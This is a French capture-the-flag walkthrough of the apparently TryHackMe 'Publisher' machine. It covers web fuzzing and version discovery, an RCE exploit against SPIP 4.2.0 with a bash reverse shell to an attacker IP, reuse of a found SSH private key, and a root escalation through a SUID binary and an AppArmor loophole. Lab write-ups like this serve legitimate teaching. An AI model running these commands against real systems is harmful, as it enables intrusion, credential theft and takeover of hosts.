- **IP**:
```
10.10.16.216
```

- **Hint**
	The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system's security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.


Nous allons commencer par un scan **nmap**:

![[publisher/file/nmap.png]]

On a un port http ouvert donc on va voir la page web de la cible

![[publisher/file/web.png]]

Nous allons découvrir les répertoires et fichier cachés avec l'outil de **fuzzing** : `ffuf`

```
ffuf -u "http://192.168.152.130/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/big.txt -mc all -fs 0 -fc 404
```

![[ffuf.png]]

On a découvert un répertoire **spip**. **spip** est un système de publication pour internet. Nous allons `whatweb` pour essayer de découvrir la version du système.

```
whatweb http://10.10.16.216/spip/
```

![[whatweb.png]]
Maintenant on sait que la version de spip est `4.2.0`. On peut donc lancer un `searchsploit` pour voir si il y a une vulnérabilité connue sur cette version

```
searchsploit spip
```

![[RCE.png]]
La vuln de cette version est donc la : **RCE**.  Avant de lancer  de lancer la commande pour l'explot, on doit d'abord mettre en place un serveur en écoute avec `netcat`

```
nc-nvlp 4444
```

Maintenant on peut lancer la commande suivante:

```
python3 51536.py -u http://10.10.16.216/spip -c "bash -c \"bash -i >& /dev/tcp/10.23.203.42/4444 0>&1\"" -v
```

Après ça on peut obtenir un shell

![[user_flag.png]]

En continuant les recherches, on peut trouver un clé ssh privé dans le répertoire `/home/think/.ssh` . Nous allons donc copié le contenu de la clé puis le rendre exécutable avec la commande `chmod 600 key_ssh`. Maintenant on peut se connecter via ssh grâce à cette clé

```
ssh -i key_ssh think@10.10.16.216
```

![[think_ssh.png]]

On va maintenant penser à élever notre privilège. On va commencer par chercher tout les fichiers **SUID** présent dans le systèmes. 

Un **fichier SUID** (Set User ID) est un fichier exécutable dont un **bit spécial** est activé dans ses permissions :  
👉 **le bit SUID (4 000)**
	Quand n’importe quel utilisateur exécute ce programme, il s’exécute avec les **droits du propriétaire du fichier**, souvent **root**.

```
find / -perm -4000 2>/dev/null
```

![[SUID.png]]
Là on voit que le binaire **/usr/sbin/run_container** a des permissions **SUID** . Nous allons donc exécuter ce binaire

![[container.png]]
Là on voit que le script qui permet au binaire de s'exécuter se trouve dans `/opt/` mais quand essaye d'aller dans ce répertoire, ça dit : `PERMISSION DENIED` . Mais le hint dans Try Hack Me nous dit d'aller voir dans un certains **App armor**

![[hint.png]]
Donc on va lister ce qu'il y a dans le répertoire `/etc/apparmor.d`

```
ls -la /etc/apparmor.d/
```

![[apparmor.png]]

On va d'abord quel est le shell par défaut de notre utilisateur avec `echo $SHELL`. la sortie de la commande est :

```
/usr/bin/ash
```

On va maintenant afficher le profil AppArmor associé au binaire **ash**

```
cat /etc/apparmor.d/usr.bin.ash
```

![[permAppArmor.png]]
Là on peut constater que les répertoires `/dev/shm` et `/var/tmp` son accessible en **écriture**.  On va copier les contenus de `/bin/bash` vers `/dev/shm` comme ça, notre utilisateur aura le droit de l'exécuter.

Maintenant on va créer notre fichier de script:

```
echo '/dev/shm/bash -p' > run_container.sh
```

Et en fin exécuter `/usr/bin/run_container` pour obtenir un shell en tant que root.










